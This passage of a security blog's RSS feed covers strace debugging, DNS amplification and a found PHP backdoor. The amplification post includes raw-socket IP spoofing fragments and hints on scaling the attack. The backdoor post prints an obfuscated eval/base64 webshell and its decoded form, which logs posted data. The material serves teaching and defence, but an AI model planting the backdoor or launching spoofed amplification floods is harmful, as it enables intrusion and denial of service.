
    _start:
        # Load all the arguments for write () 

        movl $4, %eax
        movl $1, %ebx
        movl $HelloWorldString, %ecx
        movl $12, %edx
        int $0x80

        # Need to exit the program 

        movl $1, %eax
        movl $0, %ebx
        int $0x80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I have split the _start section up in 2 fragments. One for the actually
writing of &amp;ldquo;Hello world&amp;rdquo; and one for a clean exit. Notice the int $0x80
.. these are software interrups calling the kernel. Now there is about
300 calls you can make, thats about it.&lt;/p&gt;

&lt;p&gt;First section&lt;/p&gt;

&lt;p&gt;this is the actual sys_write call as defined in
/usr/include/asm/unistd.h (it includes a unistd_64.h or unistd_32.h
depending your platform)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;        movl $4, %eax
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;file descriptor (in this case 1=STDOUT)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;        movl $1, %ebx 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;pointer to where the string &amp;ldquo;Hello World&amp;rdquo; is located&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;        movl $HelloWorldString, %ecx
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;string length of &amp;ldquo;Hello World\n&amp;rdquo;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;        movl $12, %edx
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;call the kernel&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;        int $0x80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The equivalent call in C is the ssize_t write(int fd, const void *buf,
size_t count) (man 2 write)&lt;/p&gt;

&lt;p&gt;Second section is just like the above&lt;/p&gt;

&lt;p&gt;sys_close call (1)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;        movl $1, %eax
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;exit status (0=all ok)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;        movl $0, %ebx
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Call kernel&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;        int $0x80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The equivalent call in C is the void _exit(int status) (man 2 exit)&lt;/p&gt;

&lt;p&gt;So lets run the program&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    # as -o HelloWorldProgram.o HelloWorldProgram.s
    # ld -o HelloWorldProgram HelloWorldProgram.o
    # ./HelloWorldProgram 
    Hello World
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;it works and that brings in the first tool for debugging.&lt;/p&gt;

&lt;h1 id=&#34;strace-1-trace-system-calls-and-signals:1d4aff1a42a09f40496282ff08e8849d&#34;&gt;strace(1) (trace system calls and signals)&lt;/h1&gt;

&lt;p&gt;running HelloWorldProgram via strace shows that calls are made (Like we
didn&amp;rsquo;t already knew :) )&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    # strace ./HelloWorldProgram
    execve(&amp;quot;./HelloWorldProgram&amp;quot;, [&amp;quot;./HelloWorldProgram&amp;quot;], [/* 19 vars */]) = 0
    write(1, &amp;quot;Hello World\n&amp;quot;, 12Hello World
    )           = 12
    _exit(0)                                = ?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So it starts the program, writes (our sys_write) Hello World and then
exits (our sys_close).&lt;/p&gt;

&lt;p&gt;Now this is just a boring example so lets find a better use case.&lt;/p&gt;

&lt;h1 id=&#34;use-case-1:1d4aff1a42a09f40496282ff08e8849d&#34;&gt;Use case #1&lt;/h1&gt;

&lt;p&gt;The use case for this debugging: A user cannot upload files via vsftpd
and complains. Nothing in the logs indicating other than the permissions
are wrong (Because of the &amp;ldquo;Create directory operation failed&amp;rdquo; error
message from the ftp client). So lets examine&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    # quota -q
    # quota kgn
    Disk quotas for user kgn (uid 1008): none
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Quotas seems fine and permissions are set to 777 (bad choice but this
was the case). I created a session by connecting to the ftp server&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    # ftp 127.0.0.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;login and then find the process using ps in a second terminal. Now
connect strace to the vsftpd process (in my case pid 12047). Then try to
create a directory&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    # strace -p 12047
    Process 12047 attached - interrupt to quit
    recvfrom(0, &amp;quot;MKD kgntest\r\n&amp;quot;, 4096, MSG_PEEK, NULL, NULL) = 13
    read(0, &amp;quot;MKD kgntest\r\n&amp;quot;, 13)          = 13
    getcwd(&amp;quot;/&amp;quot;, 4096)                       = 2
    mkdir(&amp;quot;kgntest&amp;quot;, 0777)                  = -1 EDQUOT (Disk quota exceeded)
    write(0, &amp;quot;550 Create directory operation f&amp;quot;..., 40) = 40
    getpid()                                = 3
    fcntl(3, F_SETLKW, {type=F_WRLCK, whence=SEEK_SET, start=0, len=0}) = 0
    write(3, &amp;quot;Thu Jul 25 20:48:20 2013 [pid 3]&amp;quot;..., 97) = 97
    fcntl(3, F_SETLK, {type=F_UNLCK, whence=SEEK_SET, start=0, len=0}) = 0
    rt_sigaction(SIGALRM, {0x4151d0, ~[RTMIN RT_1], SA_RESTORER, 0x7fed483d61e0}, NULL, 8) = 0
    alarm(300)                              = 230
    recvfrom(0, 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So lets go through the above example.&lt;/p&gt;

&lt;p&gt;The command &amp;ldquo;mkdir kgntest&amp;rdquo; received via the network to the process&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    recvfrom(0, &amp;quot;MKD kgntest\r\n&amp;quot;, 4096, MSG_PEEK, NULL, NULL) = 13
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Read the command&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    read(0, &amp;quot;MKD kgntest\r\n&amp;quot;, 13)          = 13
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Change the directory to / (its chrooted)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    getcwd(&amp;quot;/&amp;quot;, 4096)                       = 2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The actual command for creating a directory (using 777) and this fails
with EDQUOT (Disk quota exceeded). So now we know that its the quota and
not the vsftpd server or permissions (The actual fix for this is
irrelevant)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    mkdir(&amp;quot;kgntest&amp;quot;, 0777)                  = -1 EDQUOT (Disk quota exceeded)
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;use-case-2:1d4aff1a42a09f40496282ff08e8849d&#34;&gt;Use case #2&lt;/h1&gt;

&lt;p&gt;Debugging a program that says its already running even though its not.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    # puppet agent --test
    notice: Run of Puppet configuration client already in progress; skipping
    # ps -ef|grep puppet
    root     11562 11281  0 14:08 pts/1    00:00:00 grep puppet
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great, lets fire up strace&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    # strace puppet agent --test
    ... (a lot of output removed)
    mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb701c000
    _llseek(6, 0, [0], SEEK_CUR)            = 0
    read(6, &amp;quot;&amp;quot;, 4096)                       = 0
    close(6)                                = 0
    munmap(0xb701c000, 4096)                = 0
    kill(0, SIG_0)                          = 0
    stat64(&amp;quot;/var/lib/puppet/state/puppetdlock&amp;quot;, {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
    gettimeofday({1374840585, 567949}, NULL) = 0
    rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
    write(1, &amp;quot;\33[0;36mnotice: Run of Puppet con&amp;quot;..., 83notice: Run of Puppet configuration client already in progress; skipping) = 83
    write(1, &amp;quot;\n&amp;quot;, 1
    )                       = 1
    time(NULL)                              = 1374840585
    send(5, &amp;quot;&amp;lt;29&amp;gt;Jul 26 14:09:45 puppet-agent&amp;quot;..., 105, MSG_NOSIGNAL) = 105
    rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
    rt_sigaction(SIGINT, {SIG_DFL, [INT], SA_RESTART}, {0xb76e9bf0, [], 0}, 8) = 0
    close(4)                                = 0
    munmap(0xb72fb000, 4096)                = 0
    close(3)                                = 0
    munmap(0xb72fc000, 4096)                = 0
    exit_group(1)                           = ?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;so just before we get the error message &amp;ldquo;Run of Puppet configuration
client already in progress; skipping&amp;rdquo; there is a&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    stat64(&amp;quot;/var/lib/puppet/state/puppetdlock&amp;quot;, {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So puppet seems to have crashed. It created a lock file in order not to
run more than once but when crashed it forgot to cleanup.&lt;/p&gt;

&lt;p&gt;| So lets fix it&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    # rm /var/lib/puppet/state/puppetdlock
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;conclusion:1d4aff1a42a09f40496282ff08e8849d&#34;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;So now you know 2 things .. how programs actually works and how strace
can help you find the problem (strace (Linux), dtrace (BSD), truss (All
platforms))&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>DNS amplification by example</title>
      <link>https://www.greyhat.dk/dns-amplification-by-example/</link>
      <pubDate>Mon, 22 Apr 2013 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/dns-amplification-by-example/</guid>
      <description>

&lt;h1 id=&#34;how-it-works:f4145162e1daaabbe3a28d9188ad62da&#34;&gt;How it works&lt;/h1&gt;

&lt;p&gt;DNS amplification is very easy to make and quite effective. An attacker
finds a DNS resolver that is public, creates a spoofed UDP DNS request
originating from the targets address sending the DNS response to the
target. The trick in this attack is to create a bigger output then input
(hence the amplification). What better way than to request a list of
authority records for a top level like .com&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    # dig soa com @localhost

    ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.7.3 &amp;lt;&amp;lt;&amp;gt;&amp;gt; soa com @localhost
    ;; global options: +cmd
    ;; Got answer:
    ;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 60774
    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 13, ADDITIONAL: 0

    ;; QUESTION SECTION:
    ;com.               IN  SOA

    ;; ANSWER SECTION:
    com.            837 IN  SOA a.gtld-servers.net. nstld.verisign-grs.com. 1366568135 1800 900 604800 86400

    ;; AUTHORITY SECTION:
    com.            92359   IN  NS  b.gtld-servers.net.
    com.            92359   IN  NS  m.gtld-servers.net.
    com.            92359   IN  NS  l.gtld-servers.net.
    com.            92359   IN  NS  f.gtld-servers.net.
    com.            92359   IN  NS  c.gtld-servers.net.
    com.            92359   IN  NS  d.gtld-servers.net.
    com.            92359   IN  NS  g.gtld-servers.net.
    com.            92359   IN  NS  e.gtld-servers.net.
    com.            92359   IN  NS  k.gtld-servers.net.
    com.            92359   IN  NS  h.gtld-servers.net.
    com.            92359   IN  NS  j.gtld-servers.net.
    com.            92359   IN  NS  a.gtld-servers.net.
    com.            92359   IN  NS  i.gtld-servers.net.

    ;; Query time: 23 msec
    ;; SERVER: ::1#53(::1)
    ;; WHEN: Sun Apr 21 20:17:01 2013
    ;; MSG SIZE  rcvd: 300
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at this using tcpdump it gets quite clear that the request is
quite smaller than the response&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    20:17:01.146195 IP6 (hlim 64, next-header UDP (17) payload length: 29) ::1.43296 &amp;gt; ::1.53: [udp sum ok] 60774+ SOA? com. (21)
    20:17:01.168318 IP6 (hlim 64, next-header UDP (17) payload length: 308) ::1.53 &amp;gt; ::1.43296: [udp sum ok] 60774 q: SOA? com. 1/13/0 com. SOA a.gtld-servers.net. nstld.verisign-grs.com. 1366568135 1800 900 604800 86400 ns: com. NS b.gtld-servers.net., com. NS m.gtld-servers.net., com. NS l.gtld-servers.net., com. NS f.gtld-servers.net., com. NS c.gtld-servers.net., com. NS d.gtld-servers.net., com. NS g.gtld-servers.net., com. NS e.gtld-servers.net., com. NS k.gtld-servers.net., com. NS h.gtld-servers.net., com. NS j.gtld-servers.net., com. NS a.gtld-servers.net., com. NS i.gtld-servers.net. (300)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The request in this case is 21 bytes and the response is 300 bytes (That
is almost 15 times bigger) and this is without DNSSEC (DNSSEC has a much
bigger response). All these requests will of course be dropped by the
target machine but making enough of these will simply flood the
bandwidth of the server/router (Or even ISP) with very little effort.&lt;/p&gt;

&lt;h1 id=&#34;behind-the-scene:f4145162e1daaabbe3a28d9188ad62da&#34;&gt;Behind the scene&lt;/h1&gt;

&lt;p&gt;Now there is plenty of tools out for spoofing packages or one could
simply rent a botnet. But I&amp;rsquo;m a strong believer in knowing how is the
key to prevent it so lets examine how to create a spoofed UDP DNS
request using gcc and Linux.&lt;/p&gt;

&lt;p&gt;The systemcall sendto(2) is used for sending data but when combined with
raw sockets you get to customise the OSI layers (&lt;a href=&#34;http://en.wikipedia.org/wiki/IPv4_header#Header&#34; title=&#34;IP header&amp;quot; and [UDP header](http://en.wikipedia.org/wiki/User_Datagram_Protocol &amp;quot;UDP header&#34;&gt;IP header&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I have provided an example on how to create a spoofed DNS request but
the interesting parts are really&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;            packet.ip.ip_dst.s_addr = inet_addr(&amp;quot;192.168.1.1&amp;quot;);
            packet.ip.ip_src.s_addr = inet_addr(&amp;quot;192.168.1.7&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;and&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;            remote_addr.sin_addr.s_addr = packet.ip.ip_dst.s_addr;
            remote_addr.sin_port = packet.udp.uh_dport;
            remote_addr.sin_family = AF_INET;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The rest is just basic networking code using C.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://greyhat.dk/toolbox/dns_amplification.c&#34; title=&#34;Example of DNS amplification&#34;&gt;dns_amplification.c&lt;/a&gt;
only demonstrates how its done and is not suitable for a realworld
effective DOS. Buffering request like &amp;ldquo;the low bit ion cannon&amp;rdquo; and using
several toplevel soa request (.com, .eu, .edu etc) and adding lots of
DNS servers would make it effective.&lt;/p&gt;

&lt;h1 id=&#34;how-to-defend-against-this-attack:f4145162e1daaabbe3a28d9188ad62da&#34;&gt;How to defend against this attack&lt;/h1&gt;

&lt;p&gt;Since this is a bandwidth attack its a matter of having enough bandwidth
and being able to reject it. It might sound easy but its quite common to
see attacks using more than 1Gbit/s and this is where your standard
firewall most likely is already flooded and can no longer process data.
This is where the ISP comes in and can help prevent the attack by
blocking the attack in the core network.&lt;/p&gt;

&lt;p&gt;Now &lt;a href=&#34;http://openresolverproject.org/&#34; title=&#34;Openresolver project&#34;&gt;openresolverproject.org&lt;/a&gt;
uncovered a lot of open DNS resolvers (Roughly counted more than
20.000+) and if the attacker was using all these (And a botnet) and
assuming they all have a 1Gbit/s connection you could create a
19.5TBit/s attack!. We have already seen a 300Gbit/s attack on spamhaus
causing a major slowdown on the internet. But a 19.5TB attack would take
down large parts of the internet so of course no ISP can prevent this.&lt;/p&gt;

&lt;h1 id=&#34;why-is-this-attack-even-possible:f4145162e1daaabbe3a28d9188ad62da&#34;&gt;Why is this attack even possible&lt;/h1&gt;

&lt;p&gt;Several parties besides the attacker come to mind here.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Software vendors for not making a better default configuration making
it a open resolver per default&lt;/li&gt;
&lt;li&gt;End users who install software not knowing how to prober configure
the software&lt;/li&gt;
&lt;li&gt;ISPs for not blocking spoofed traffic from their network (They should
block outbound traffic that does not originate from the network)&lt;/li&gt;
&lt;li&gt;ISPs for not telling the end user about this security issue and not
acting on it (Blocking ports)&lt;/li&gt;
&lt;li&gt;ISPs for not responding to abuse complaints&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As it is now things will never get fixed. Spamhaus created a lookup
database for open dns resolvers (So ISP could block for these
misconfigred servers) but since the ISP properly would loose customers
due to blocking they will never use it (And they would have to use
excessive CPU on the border routers to handle it). And since there is no
law to actually get abuse complaints enforced the ISP will not take
responsibility. So it all comes down to money in the end.&lt;/p&gt;

&lt;p&gt;The way I would like it to work is to simply&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Create a abuse report to the ISP and CC ripe (or a taskforce for
handling abuse world wide) for every abuse case&lt;/li&gt;
&lt;li&gt;The task force should register the amount of abuse based on allocated
subnet&lt;/li&gt;
&lt;li&gt;Fail to handle abuse enough times and the task force should simply
remove the subnet allocation removing the network from the ISP&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This will make the ISP care about security since loosing IP&amp;rsquo;s will force
their customers offline. And ISPs known to host spammers would simply be
shutdown by loosing all their IPs.&lt;/p&gt;

&lt;p&gt;The last DNS amplification I handled I created a script for creating
abuse reports. Just to take the top 2 abuse accounts from the list of
open resolvers&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;        189 abuse@oneandone.net
       1503 abuse@ovh.net
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So 1503 servers with open resolvers from one single ISP .. Created a
abuse report on this within 12 hours of the incident (More than 10 days
ago) and all of these servers are still online and I never heard a
single word (Weird enough this seems to be the standard not to reply).&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Scanning for recursive DNS servers</title>
      <link>https://www.greyhat.dk/scanning-for-recursive-dns-servers/</link>
      <pubDate>Thu, 11 Apr 2013 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/scanning-for-recursive-dns-servers/</guid>
      <description>&lt;p&gt;When working for an ISP it becomes pretty clear that you don&amp;rsquo;t want your
customers or your network to participate in any attack. I wrote a small
perl script to find DNS servers open for recursive requests&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://greyhat.dk/toolbox/scandns.pl&#34; title=&#34;Perl script for scanning for vulnerable DNS servers&#34;&gt;scandns.pl&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I found 19 misconfigured DNS servers. Now the real work starts by
contacting the owners.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Lancope stealthwatch</title>
      <link>https://www.greyhat.dk/lancope-stealthwatch/</link>
      <pubDate>Thu, 28 Feb 2013 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/lancope-stealthwatch/</guid>
      <description>&lt;p&gt;Had a nice meeting yesterday with Cisco and some guys from Lanecope.
Must say that stealthwatch seems like a really great product. What their
product does is that is collects all flows (and more). Sums it up so you
can drill down via connections.&lt;/p&gt;

&lt;p&gt;Basically it does something like this on your netflow data&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    ~$ nfdump -R /var/cache/nfdump/data/asr0/nfcapd.201302281130:asr1/nfcapd.201302281133 -o long  &#39;dst host 77.66.32.1&#39;|head -10
    Date flow start          Duration Proto      Src IP Addr:Port          Dst IP Addr:Port   Flags Tos  Packets    Bytes Flows
    2013-02-28 11:29:58.616     0.000 TCP      198.89.107.36:41257 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.612     0.000 TCP       181.3.74.102:23628 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.612     0.000 TCP      122.149.174.9:25733 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.612     0.000 TCP     175.217.179.22:27301 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.613     0.000 TCP     141.149.190.34:56307 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.613     0.000 TCP       70.248.23.39:10543 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.613     0.000 TCP      96.45.178.104:62559 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.613     0.000 TCP      218.92.100.34:56154 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.613     0.000 TCP      59.37.156.114:34888 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Stores it in a database for billing, security audits but also for
network analysis. The network analysis is based on policies and known
patterns (Beacons, traffic patterns/ports/flags, roundtrip etc). Then
lets you drill down on a specific hostgroup or target to see who, when
and that it talked to. It also integres ICE and logs from DHCP.&lt;/p&gt;

&lt;p&gt;Based on this is can alert you if your are under DDOS or if someone just
just stole your files (Requires some configuration) or if some of your
hosts is part of a botnet. Really nice but properly also quite
expensive.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>PHP backdoor</title>
      <link>https://www.greyhat.dk/php-backdoor/</link>
      <pubDate>Sat, 23 Feb 2013 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/php-backdoor/</guid>
      <description>&lt;p&gt;Found this little thing on FB tonight.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    &amp;lt;?php eval(gzinflate(base64_decode(&amp;quot;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&amp;quot;))); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After unrolling the endless loops it turns out to be&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    &amp;lt;? @error_reporting(0); @ini_set(&amp;quot;display_errors&amp;quot;,0); @ini_set(&amp;quot;log_errors&amp;quot;,0); @ini_set(&amp;quot;error_log&amp;quot;,0); if (isset($_GET[&#39;r&#39;])) { print $_GET[&#39;r&#39;]; } elseif (isset($_POST[&#39;e&#39;])) { print(base64_decode(str_rot13(strrev(base64_decode(str_rot13($_POST[&#39;e&#39;])))))); } elseif (isset($_SERVER[&#39;HTTP_CONTENT_ENCODING&#39;]) &amp;amp;&amp;amp; $_SERVER[&#39;HTTP_CONTENT_ENCODING&#39;] == &#39;binary&#39;) { $data = file_get_contents(&#39;php://input&#39;); if (strlen($data) &amp;gt; 0) print &#39;STATUS-IMPORT-OK&#39;; if (strlen($data) &amp;gt; 12) { $fp=@fopen(&#39;tmpfile&#39;,&#39;a&#39;); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER[&#39;REMOTE_ADDR&#39;].&amp;quot;\t&amp;quot;.base64_encode($data).&amp;quot;\r\n&amp;quot;); @flock($fp, LOCK_UN); @fclose($fp); } } exit;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;a backdoor&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>About</title>
      <link>https://www.greyhat.dk/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/about/</guid>
      <description>&lt;p&gt;Hi,&lt;/p&gt;

&lt;p&gt;I’m a system administrator with a background as a programmer. Strong interest in computer security.&lt;/p&gt;

&lt;p&gt;Started quite early programming demos (&lt;a href=&#34;https://www.scene.org/&#34;&gt;https://www.scene.org/&lt;/a&gt;). Never had the strong urge to play games but building the graphics around a game was fun. This started with Basic, Pascal and then moved to C and x86 assembly language.&lt;/p&gt;

&lt;p&gt;Keys:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Father of a beautiful daughter&lt;/li&gt;
&lt;li&gt;Certified VCP5&lt;/li&gt;
&lt;li&gt;Certified CEHv8&lt;/li&gt;
&lt;li&gt;Contact: me@ this website&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Links</title>
      <link>https://www.greyhat.dk/links/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/links/</guid>
      <description>

&lt;h3 id=&#34;miscellaneous:424069113a08a4256349764ee38dbbbf&#34;&gt;Miscellaneous&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;http://i1.dk&#34; title=&#34;Ivans website&#34;&gt;Ivan Jørgensen&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://wasd.dk&#34; title=&#34;Bjarkes website&#34;&gt;Bjarke Sørensen&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>